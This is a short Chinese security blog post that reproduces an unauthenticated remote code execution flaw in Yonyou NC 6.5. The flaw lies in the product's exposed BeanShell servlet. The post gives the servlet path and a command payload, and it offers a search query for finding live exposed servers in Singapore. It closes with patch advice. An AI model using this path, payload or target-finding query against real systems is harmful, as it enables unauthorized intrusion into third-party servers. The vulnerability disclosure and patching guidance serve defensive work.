> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XEaNNjYs2FJ5RruFwAiIrg)

**上方蓝色字体关注我们，一起学安全！**

**作者：****蚂蚁** **@Timeline Sec**

**本文字数：361**

**阅读时长：2～3min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

用友 NC 是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。  

**0x02 漏洞概述**  

  

用友 NC 由于对外开放了 BeanShell 接口，攻击者可以在未授权的情况下直接访问该接口，并构造恶意数据执行任意代码从而获取服务器权限。  

**0x03 影响版本**  

  

用友 NC6.5 版本  

**0x04 环境搭建**  

  

国外在线环境  

```
title=="YONYOU NC" && country="SG"
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2VRMbLFNeDG86EHTTlKfdLpUbAUKBoln77qNJoc9uBtVXGpyEBgY0cw/640?wx_fmt=png)  

**0x05 漏洞复现**  

  

1、访问  

/servlet/~ic/bsh.servlet.BshServlet  

得到如图：

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2x5APTG0WEmJ81DGbqbcnXQlsGCBxWrWzN8dYDqab0fxsibejKEPdokw/640?wx_fmt=jpeg)  

2、我们发现这里有执行代码的接口我们输入 payload 如：`exec("whoami");`即可看到命令执行成功  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2q5GKyO5XbchHJnmLBb9TpBQI5OIfuwicKL87PGlnCVrYJL0JkWBwu7w/640?wx_fmt=png)  

**0x06 修复方式**  

  

该漏洞为第三方 jar 包漏洞导致，用友 NC 官方已发布安全补丁，建议使用该产品的用户及时安装该漏洞补丁包。  

补丁下载链接：

```
http://umc.yonyou.com/ump/querypatchdetailedmng? PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行